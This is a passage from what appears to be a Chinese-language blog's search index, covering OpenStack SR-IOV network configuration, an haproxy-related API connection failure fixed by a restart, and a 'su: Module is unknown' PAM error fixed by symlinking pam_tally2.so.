class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">10</span><span class="selector-class">.5</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">10</span><span class="selector-class">.6</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">10</span><span class="selector-class">.7</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">11</span><span class="selector-class">.0</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">11</span><span class="selector-class">.1</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">11</span><span class="selector-class">.2</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">11</span><span class="selector-class">.3</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">11</span><span class="selector-class">.4</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">11</span><span class="selector-class">.5</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">11</span><span class="selector-class">.6</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br><span class="line"><span class="selector-tag">05</span>:<span class="selector-tag">11</span><span class="selector-class">.7</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">controller</span> <span class="selector-attr">[0200]</span>: <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span> <span class="selector-tag">82599</span> <span class="selector-tag">Ethernet</span> <span class="selector-tag">Controller</span> <span class="selector-tag">Virtual</span> <span class="selector-tag">Function</span> <span class="selector-attr">[8086:10ed]</span> (rev <span class="number">01</span>)</span><br></pre></td></tr></table></figure></li><li>配置设备ID<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># vim <span class="regexp">/etc/</span>neutron<span class="regexp">/plugins/m</span>l2/ml2_conf_sriov.ini</span><br><span class="line"></span><br><span class="line">[ml2_sriov]</span><br><span class="line">supported_pci_vendor_devs = <span class="number">8086</span>:<span class="number">10</span>ed</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-修改-neutron-server-启动文件-加载-ml2-conf-sriov-ini-文件"><a href="#4-修改-neutron-server-启动文件-加载-ml2-conf-sriov-ini-文件" class="headerlink" title="4. 修改 neutron-server 启动文件,加载 ml2_conf_sriov.ini 文件"></a>4. 修改 neutron-server 启动文件,加载 ml2_conf_sriov.ini 文件</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># vim <span class="regexp">/usr/</span>lib<span class="regexp">/systemd/</span>system/neutron-server.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line">User=neutron</span><br><span class="line">ExecStart=<span class="regexp">/usr/</span>bin<span class="regexp">/neutron-server --config-file /u</span>sr<span class="regexp">/share/</span>neutron<span class="regexp">/neutron-dist.conf --config-dir /u</span>sr<span class="regexp">/share/</span>neutron<span class="regexp">/server --config-file /</span>etc<span class="regexp">/neutron/</span>neutron.conf --config-<span class="keyword">file</span> <span class="regexp">/etc/</span>neutron<span class="regexp">/plugin.ini --config-file /</span>etc<span class="regexp">/neutron/</span>plugins<span class="regexp">/ml2/m</span>l2_conf_sriov.ini --config-dir <span class="regexp">/etc/</span>neutron<span class="regexp">/conf.d/</span>common --config-dir <span class="regexp">/etc/</span>neutron<span class="regexp">/conf.d/</span>neutron-server --log-<span class="keyword">file</span> <span class="regexp">/var/</span>log<span class="regexp">/neutron/</span>server.log</span><br></pre></td></tr></table></figure><h4 id="5-重启服务"><a href="#5-重启服务" class="headerlink" title="5. 重启服务"></a>5. 重启服务</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl daemon-reload</span></span><br><span class="line"><span class="meta"># systemctl restart neutron-server.service</span></span><br><span class="line"><span class="meta"># systemctl restart openstack-nova-scheduler.service</span></span><br></pre></td></tr></table></figure><h3 id="计算节点配置"><a href="#计算节点配置" class="headerlink" title="计算节点配置"></a>计算节点配置</h3><h4 id="1-配置-PCI-设备白名单"><a href="#1-配置-PCI-设备白名单" class="headerlink" title="1. 配置 PCI 设备白名单"></a>1. 配置 PCI 设备白名单</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/nova/nova.conf</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">pci_passthrough_whitelist</span> = [&#123;<span class="string">&quot;devname&quot;</span>:<span class="string">&quot;ens1f0&quot;</span>,<span class="string">&quot;physical_network&quot;</span>:<span class="string">&quot;sriov1&quot;</span>&#125;,&#123;<span class="string">&quot;devname&quot;</span>:<span class="string">&quot;ens1f1&quot;</span>,<span class="string">&quot;physical_network&quot;</span>:<span class="string">&quot;sriov2&quot;</span>&#125;]</span><br></pre></td></tr></table></figure><h4 id="2-配置-SR-IOV-neutron-agent"><a href="#2-配置-SR-IOV-neutron-agent" class="headerlink" title="2. 配置 SR-IOV neutron agent"></a>2. 配置 SR-IOV neutron agent</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># vim <span class="regexp">/etc/</span>neutron<span class="regexp">/plugins/m</span>l2/sriov_agent.ini</span><br><span class="line"></span><br><span class="line">[securitygroup]</span><br><span class="line">firewall_driver = neutron.agent.firewall.NoopFirewallDriver</span><br><span class="line"></span><br><span class="line">[sriov_nic]</span><br><span class="line">physical_device_mappings = sriov1:ens1f0,sriov2:ens1f1</span><br><span class="line">exclude_devices =</span><br></pre></td></tr></table></figure><h4 id="3-启动-重启服务"><a href="#3-启动-重启服务" class="headerlink" title="3. 启动/重启服务"></a>3. 启动/重启服务</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl enable neutron-sriov-nic-agent.service</span></span><br><span class="line"><span class="meta"># systemctl start neutron-sriov-nic-agent.service</span></span><br><span class="line"><span class="meta"># systemctl restart openstack-nova-compute.service</span></span><br></pre></td></tr></table></figure><h2 id="五、测试"><a href="#五、测试" class="headerlink" title="五、测试"></a>五、测试</h2><h3 id="1-创建网络"><a href="#1-创建网络" class="headerlink" title="1. 创建网络"></a>1. 创建网络</h3><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">创建网络</span></span><br><span class="line"><span class="comment">#</span> <span class="comment">neutron</span> <span class="comment">net</span><span class="literal">-</span><span class="comment">create</span> --<span class="comment">provider:network_type</span> <span class="comment">vlan</span> --<span class="comment">provider:physical_network</span> <span class="comment">sriov1</span> --<span class="comment">provider:segmentation_id</span> <span class="comment">10</span> --<span class="comment">router:external</span> <span class="comment">net1</span></span><br><span class="line"><span class="comment">#</span> <span class="comment">neutron</span> <span class="comment">net</span><span class="literal">-</span><span class="comment">create</span> --<span class="comment">provider:network_type</span> <span class="comment">vlan</span> --<span class="comment">provider:physical_network</span> <span class="comment">sriov2</span> --<span class="comment">provider:segmentation_id</span> <span class="comment">20</span> --<span class="comment">router:external</span> <span class="comment">net2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">创建子网(禁用DHCP)</span></span><br><span class="line"><span class="comment">#</span> <span class="comment">neutron</span> <span class="comment">subnet</span><span class="literal">-</span><span class="comment">create</span> --<span class="comment">name</span> <span class="comment">sriov1</span><span class="literal">-</span><span class="comment">net</span> --<span class="comment">disable</span><span class="literal">-</span><span class="comment">dhcp</span> --<span class="comment">ip</span><span class="literal">-</span><span class="comment">version</span> <span class="comment">4</span> <span class="comment">net1</span> <span class="comment">10</span><span class="string">.</span><span class="comment">0</span><span class="string">.</span><span class="comment">1</span><span class="string">.</span><span class="comment">0/24</span></span><br><span class="line"><span class="comment">#</span> <span class="comment">neutron</span> <span class="comment">subnet</span><span class="literal">-</span><span class="comment">create</span> --<span class="comment">name</span> <span class="comment">sriov2</span><span class="literal">-</span><span class="comment">net</span> --<span class="comment">disable</span><span class="literal">-</span><span class="comment">dhcp</span> --<span class="comment">ip</span><span class="literal">-</span><span class="comment">version</span> <span class="comment">4</span> <span class="comment">net2</span> <span class="comment">10</span><span class="string">.</span><span class="comment">0</span><span class="string">.</span><span class="comment">2</span><span class="string">.</span><span class="comment">0/24</span></span><br></pre></td></tr></table></figure><h3 id="2-创建-port"><a href="#2-创建-port" class="headerlink" title="2. 创建 port"></a>2. 创建 port</h3><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"># neutron <span class="keyword">port</span>-create net1 <span class="comment">--binding:vnic-type direct</span></span><br><span class="line"># neutron <span class="keyword">port</span>-create net2 <span class="comment">--binding:vnic-type direct</span></span><br></pre></td></tr></table></figure><h3 id="3-创建虚拟机"><a href="#3-创建虚拟机" class="headerlink" title="3. 创建虚拟机"></a>3. 创建虚拟机</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># neutron port-list</span></span><br><span class="line">+<span class="params">--------------------------------------</span>+<span class="params">------</span>+<span class="params">-------------------</span>+<span class="params">---------------------------------------------------------------------------------</span>+</span><br><span class="line">| id                                   | name | mac_address       | fixed_ips                                                                       |</span><br><span class="line">+<span class="params">--------------------------------------</span>+<span class="params">------</span>+<span class="params">-------------------</span>+<span class="params">---------------------------------------------------------------------------------</span>+</span><br><span class="line">| ba446152-bd45-4a38-9947-1d539e538a68 |      | fa<span class="function">:16</span><span class="function">:3e</span><span class="function">:42</span><span class="function">:6b</span><span class="function">:fd</span> | &#123;<span class="string">&quot;subnet_id&quot;</span>: <span class="string">&quot;04ea17b5-08da-41cc-8114-e0781a1f8041&quot;</span>, <span class="string">&quot;ip_address&quot;</span>: <span class="string">&quot;10.0.1.3&quot;</span>&#125; |</span><br><span class="line">| bf8a7655-ac16-4dce-bb12-54efd2dd0967 |      | fa<span class="function">:16</span><span class="function">:3e</span><span class="function">:77</span><span class="function">:9f</span><span class="function">:8a</span> | &#123;<span class="string">&quot;subnet_id&quot;</span>: <span class="string">&quot;6612bf80-d682-474f-886e-93029a4a0964&quot;</span>, <span class="string">&quot;ip_address&quot;</span>: <span class="string">&quot;10.0.2.3&quot;</span>&#125; |</span><br><span class="line">+<span class="params">--------------------------------------</span>+<span class="params">------</span>+<span class="params">-------------------</span>+<span class="params">---------------------------------------------------------------------------------</span>+</span><br><span class="line"></span><br><span class="line"><span class="comment"># openstack server create --image rhel-server-7.5-x86_64-kvm --flavor 6 --nic port-id=ba446152-bd45-4a38-9947-1d539e538a68 --nic port-id=bf8a7655-ac16-4dce-bb12-54efd2dd0967 --config-drive True test</span></span><br></pre></td></tr></table></figure><h3 id="4-查看虚拟机网卡"><a href="#4-查看虚拟机网卡" class="headerlink" title="4. 查看虚拟机网卡"></a>4. 查看虚拟机网卡</h3><ul><li>速率<br><img data-src="/images/uploads/2018/06/ethtool.png" alt="网络速率"></li><li>型号<br><img data-src="/images/uploads/2018/06/ethernet.png" alt="网卡型号"></li></ul><h3 id="5-查看-VF"><a href="#5-查看-VF" class="headerlink" title="5. 查看 VF"></a>5. 查看 VF</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip link show ens1f0</span></span><br><span class="line"><span class="attribute">6</span>: ens<span class="number">1</span>f<span class="number">0</span>: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc mq state UP mode DEFAULT qlen <span class="number">1000</span></span><br><span class="line">    <span class="attribute">link</span>/ether <span class="number">14</span>:<span class="number">02</span>:ec:<span class="number">82</span>:<span class="number">96</span>:c<span class="number">0</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">0</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">1</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">2</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">3</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">4</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">5</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">6</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">7</span> MAC fa:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">42</span>:<span class="number">6</span>b:fd, vlan <span class="number">10</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip link show ens1f1</span></span><br><span class="line"><span class="attribute">7</span>: ens<span class="number">1</span>f<span class="number">1</span>: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc mq state UP mode DEFAULT qlen <span class="number">1000</span></span><br><span class="line">    <span class="attribute">link</span>/ether <span class="number">14</span>:<span class="number">02</span>:ec:<span class="number">82</span>:<span class="number">96</span>:c<span class="number">1</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">0</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">1</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">2</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">3</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">4</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">5</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">6</span> MAC <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br><span class="line">    <span class="attribute">vf</span> <span class="number">7</span> MAC fa:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">77</span>:<span class="number">9</span>f:<span class="number">8</span>a, vlan <span class="number">20</span>, spoof checking <span class="literal">on</span>, link-state auto</span><br></pre></td></tr></table></figure><hr><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://wiki.openstack.org/wiki/SR-IOV-Passthrough-For-Networking">SR-IOV-Passthrough-For-Networking</a><br><a href="https://docs.openstack.org/ocata/networking-guide/config-sriov.html">OpenStack Networking Guide</a><br><a href="http://www.cnblogs.com/wanstack/p/8757379.html">OpenStack Mitaka Neutron SR-IOV配置</a></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> sr-iov </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openstack 无法连接 Connection aborted , BadStatusLine</title>
      <link href="openstack/openstack-connection-aborted.html"/>
      <url>openstack/openstack-connection-aborted.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-发现问题"><a href="#1-发现问题" class="headerlink" title="1. 发现问题"></a>1. 发现问题</h2><p>发现某个节点无法查询网络，继而发现所有的客户端都无法正确查询，而且错误相同</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cinder 服务无法访问</span><br><span class="line">[root@controller01 ~]<span class="comment"># cinder list</span></span><br><span class="line">ERROR: Unable to establish connection to http:<span class="regexp">//</span>nt-controller:<span class="number">8776</span><span class="regexp">/v2/</span><span class="number">364307</span>d25ca8465daa7982dafc625f05<span class="regexp">/volumes/</span>detail: (<span class="string">&#x27;Connection aborted.&#x27;</span>, BadStatusLine(<span class="string">&quot;&#x27;&#x27;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">nova服务无法访问</span><br><span class="line">[root@controller01 ~]<span class="comment"># nova list</span></span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/novaclient/</span>client.py:<span class="number">278</span>: UserWarning: The <span class="string">&#x27;tenant_id&#x27;</span> argument is deprecated <span class="keyword">in</span> Ocata and its use may result <span class="keyword">in</span> errors <span class="keyword">in</span> future releases. As <span class="string">&#x27;project_id&#x27;</span> is provided, the <span class="string">&#x27;tenant_id&#x27;</span> argument will be ignored.</span><br><span class="line">  warnings.warn(msg)</span><br><span class="line">ERROR (ConnectFailure): Unable to establish connection to http:<span class="regexp">//</span>nt-controller:<span class="number">8774</span><span class="regexp">/v2.1/</span><span class="number">364307</span>d25ca8465daa7982dafc625f05<span class="regexp">/servers/</span>detail: (<span class="string">&#x27;Connection aborted.&#x27;</span>, BadStatusLine(<span class="string">&quot;&#x27;&#x27;&quot;</span>,))</span><br></pre></td></tr></table></figure><h2 id="2-问题排查"><a href="#2-问题排查" class="headerlink" title="2. 问题排查"></a>2. 问题排查</h2><h3 id="手动-telnet-端口可以连接"><a href="#手动-telnet-端口可以连接" class="headerlink" title="手动 telnet 端口可以连接"></a>手动 telnet 端口可以连接</h3><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">[root@controller01 ~]<span class="comment"># telnet nt-controller 8774</span></span><br><span class="line">Trying <span class="number">192.168</span>.<span class="number">105.253</span>...</span><br><span class="line">Connected <span class="keyword">to</span> nt-controller.</span><br><span class="line">Escape character <span class="keyword">is</span> <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Connection closed <span class="keyword">by</span> foreign host.</span><br></pre></td></tr></table></figure><h3 id="conductor-和-api-服务有无法连接数据库的错误"><a href="#conductor-和-api-服务有无法连接数据库的错误" class="headerlink" title="conductor 和 api 服务有无法连接数据库的错误"></a>conductor 和 api 服务有无法连接数据库的错误</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">2018</span>-<span class="number">05</span>-<span class="number">30</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">08</span>.<span class="number">609</span> <span class="number">29270</span> ERROR nova.servicegroup.drivers.db     return self.dbapi.connect(*cargs, **cparams)</span><br><span class="line"><span class="attribute">2018</span>-<span class="number">05</span>-<span class="number">30</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">08</span>.<span class="number">609</span> <span class="number">29270</span> ERROR nova.servicegroup.drivers.db   File <span class="string">&quot;/usr/lib/python2.7/site-packages/pymysql/__init__.py&quot;</span>, line <span class="number">90</span>, in Connect</span><br><span class="line"><span class="attribute">2018</span>-<span class="number">05</span>-<span class="number">30</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">08</span>.<span class="number">609</span> <span class="number">29270</span> ERROR nova.servicegroup.drivers.db     return Connection(*args, **kwargs)</span><br><span class="line"><span class="attribute">2018</span>-<span class="number">05</span>-<span class="number">30</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">08</span>.<span class="number">609</span> <span class="number">29270</span> ERROR nova.servicegroup.drivers.db   File <span class="string">&quot;/usr/lib/python2.7/site-packages/pymysql/connections.py&quot;</span>, line <span class="number">694</span>, in __init__</span><br><span class="line"><span class="attribute">2018</span>-<span class="number">05</span>-<span class="number">30</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">08</span>.<span class="number">609</span> <span class="number">29270</span> ERROR nova.servicegroup.drivers.db     self.connect()</span><br><span class="line"><span class="attribute">2018</span>-<span class="number">05</span>-<span class="number">30</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">08</span>.<span class="number">609</span> <span class="number">29270</span> ERROR nova.servicegroup.drivers.db   File <span class="string">&quot;/usr/lib/python2.7/site-packages/pymysql/connections.py&quot;</span>, line <span class="number">947</span>, in connect</span><br><span class="line"><span class="attribute">2018</span>-<span class="number">05</span>-<span class="number">30</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">08</span>.<span class="number">609</span> <span class="number">29270</span> ERROR nova.servicegroup.drivers.db     raise exc</span><br><span class="line"><span class="attribute">2018</span>-<span class="number">05</span>-<span class="number">30</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">08</span>.<span class="number">609</span> <span class="number">29270</span> ERROR nova.servicegroup.drivers.db DBConnectionError: (pymysql.err.OperationalError) (<span class="number">2003</span>, <span class="string">&quot;Can&#x27;t connect to MySQL server on &#x27;nt-controller&#x27; ([Errno 111] ECONNREFUSED)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="查看数据库集群状态-集群正常"><a href="#查看数据库集群状态-集群正常" class="headerlink" title="查看数据库集群状态(集群正常)"></a>查看数据库集群状态(集群正常)</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; SHOW STATUS LIKE <span class="emphasis">&#x27;wsrep_cluster_size&#x27;</span>;</span><br><span class="line"><span class="code">+--------------------+</span>-------+</span><br><span class="line">| Variable_name      | Value |</span><br><span class="line"><span class="code">+--------------------+</span>-------+</span><br><span class="line">| wsrep_cluster_size | 3     |</span><br><span class="line"><span class="code">+--------------------+</span>-------+</span><br></pre></td></tr></table></figure><h2 id="3-问题解决"><a href="#3-问题解决" class="headerlink" title="3. 问题解决"></a>3. 问题解决</h2><p>全部服务都无法连接，而keystone服务又是正常（鉴权服务不在本地），数据库服务也正常，同时和这么多服务有关联的就是 haproxy 了，手动重启 haproxy 后问题解决（haproxy监听端口正常，可能发生了crash）。</p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> haproxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>切换用户报错 su Module is unknown</title>
      <link href="linux/su-module-is-unknown.html"/>
      <url>linux/su-module-is-unknown.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-发现问题"><a href="#1-发现问题" class="headerlink" title="1. 发现问题"></a>1. 发现问题</h3><p>安全加固后的虚拟机使用普通用户登陆，然后切换到 root 用户的时候有如下报错</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">$ su root</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line"><span class="symbol">su:</span> Module is unknown</span><br></pre></td></tr></table></figure><h3 id="2-查找错误"><a href="#2-查找错误" class="headerlink" title="2. 查找错误"></a>2. 查找错误</h3><p>查看 /var/log/secure 文件有如下错误, 找不到库文件 pam_tally.so</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /var/log/secure</span></span><br><span class="line"><span class="attribute">Apr</span> <span class="number">16</span> <span class="number">16</span>:<span class="number">45</span>:<span class="number">32</span> compute<span class="number">01</span> sshd[<span class="number">21311</span>]: pam_unix(sshd:session): session opened for user vmuser by (uid=<span class="number">0</span>)</span><br><span class="line"><span class="attribute">Apr</span> <span class="number">16</span> <span class="number">16</span>:<span class="number">45</span>:<span class="number">34</span> compute<span class="number">01</span> su: PAM unable to dlopen(/usr/lib<span class="number">64</span>/security/pam_tally.so): /usr/lib<span class="number">64</span>/security/pam_tally.so: cannot open shared object file: No such file or directory</span><br><span class="line"><span class="attribute">Apr</span> <span class="number">16</span> <span class="number">16</span>:<span class="number">45</span>:<span class="number">34</span> compute<span class="number">01</span> su: PAM adding faulty module: /usr/lib<span class="number">64</span>/security/pam_tally.so</span><br></pre></td></tr></table></figure><h3 id="3-解决办法"><a href="#3-解决办法" class="headerlink" title="3. 解决办法"></a>3. 解决办法</h3><p>把 pam_tally2.so 链接到 pam_tally.so</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># ln -s <span class="regexp">/lib64/</span>security<span class="regexp">/pam_tally2.so /</span>lib64<span class="regexp">/security/</span>pam_tally.so</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenStack Project-Zun(容器管理)</title>
